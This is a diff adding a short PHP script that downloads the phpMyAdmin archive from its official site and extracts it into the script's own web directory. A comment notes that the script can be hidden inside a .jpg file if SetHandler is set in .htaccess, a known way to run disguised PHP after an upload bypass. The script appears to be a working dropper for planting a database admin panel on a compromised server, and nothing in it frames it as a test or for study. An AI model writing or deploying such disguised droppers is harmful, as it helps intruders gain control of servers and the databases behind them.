@@ -1,0 +1,30 @@
+<?php
+// This can be inside a .jpg file if SetHandler is set in .htaccess
+
+$url = 'https://files.phpmyadmin.net/phpMyAdmin/5.2.3/phpMyAdmin-5.2.3-all-languages.zip';
+$zipPath = __DIR__ . '/phpMyAdmin.zip';
+
+// cURL method
+$ch = curl_init($url);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+$data = curl_exec($ch);
+$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+curl_close($ch);
+
+if ($data === false || $httpCode !== 200) {
+    die("Download failed: $httpCode");
+}
+
+file_put_contents($zipPath, $data);
+
+// Extract ZIP
+$zip = new ZipArchive;
+if ($zip->open($zipPath) === true) {
+    $zip->extractTo(__DIR__);
+    $zip->close();
+    echo "Extracted successfully!";
+} else {
+    echo "Extraction failed!";
+}
+?>
